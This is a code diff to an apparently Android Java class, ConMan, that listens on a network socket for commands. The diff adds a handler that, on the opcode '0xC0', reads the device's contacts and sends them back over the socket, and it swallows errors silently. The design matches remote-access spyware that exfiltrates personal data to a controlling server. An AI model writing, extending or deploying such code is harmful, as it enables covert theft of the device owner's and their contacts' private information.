@@ -8,6 +8,7 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
+import java.nio.charset.StandardCharsets;
 
 public class ConMan {
 
@@ -30,7 +31,7 @@ public class ConMan {
         BufferedWriter out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
 
         // Perform Operations
-        performOps(in, out);
+        getOps(in, out);
 
         // Waiting for socket close
         socket.wait();
@@ -40,13 +41,15 @@ public class ConMan {
         socket.getOutputStream().close();
     }
 
-    private static void performOps(BufferedReader in, BufferedWriter out) {
+    private static void getOps(BufferedReader in, BufferedWriter out) {
         new Thread(() -> {
             try {
-                String incomingMessage = in.readLine() + System.getProperty("line.separator");
-                Log.e("SOCK101", incomingMessage);
+                String incomingMessage = in.readLine();
 
-                out.write("OK", 0, 2);
+                String message = performOps(incomingMessage);
+                int messageLength = message.getBytes(StandardCharsets.UTF_8).length;
+
+                out.write(message, 0, messageLength);
                 out.flush();
             } catch (Exception e) {
                 // die silently
@@ -62,6 +65,23 @@ public class ConMan {
                 }
             }
         }).start();
+    }
+
+    private static String performOps(String op){
+        String returnMessage;
+
+        Log.e("SOCK101", op);
+
+        switch (op) {
+            // Contacts
+            case "0xC0":
+                returnMessage = String.valueOf(ContactsMan.getContacts());
+                break;
+            default:
+                returnMessage = "Invalid";
+        }
+
+        return returnMessage;
     }
 
     /*
